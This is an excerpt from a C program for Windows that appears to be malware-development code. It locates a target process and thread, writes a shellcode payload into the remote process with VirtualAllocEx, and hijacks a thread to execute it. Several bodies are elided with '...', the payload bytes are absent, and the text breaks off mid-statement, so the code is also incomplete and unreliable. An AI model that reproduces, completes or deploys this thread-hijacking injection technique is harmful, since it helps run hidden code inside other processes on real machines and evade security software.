...
BOOL GetRemoteProcessHandle(LPCWSTR szProcName, DWORD* pdwPid, HANDLE* phProcess) {
	...
	if (*pdwPid == NULL || *phProcess == NULL)
		...
		printf("[i] Found Target process id %d\n", *pdwPid);
		return TRUE;
...
_EndOfFunction:
	...
	if (*dwThreadId == NULL || *hThread == NULL)
		return FALSE;
	printf("[i] Found Target Thread id %d\n", *dwThreadId);
	return TRUE;
}
...
BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* ppAddress) {
	...
	*ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	...
	printf("Succesfully Written Payload");
	return TRUE;
}
...
int main() {
	...
	if (!GetRemoteProcessHandle(szProcName, &pdwPid, &phProcess)) {
	...
	if (!GetRemoteThreadhandle(pdwPid, &dwThreadId, &hThread)) {
		printf("GetRemoteThreadhandle Failed");
	}
	SIZE_T sSizeOfShellcode = sizeof(Payload);
	PVOID* ppAddress = NULL;
	if (!InjectShellcodeToRemoteProcess(phProcess, Payload, sSizeOfShellcode, &ppAddress)) {
		printf("InjectShellcodeToRemoteProcess Failed");
	}

	printf("\nEnter to execute payload");
	

	if (!HijackThread(hThread, ppAddress)) {
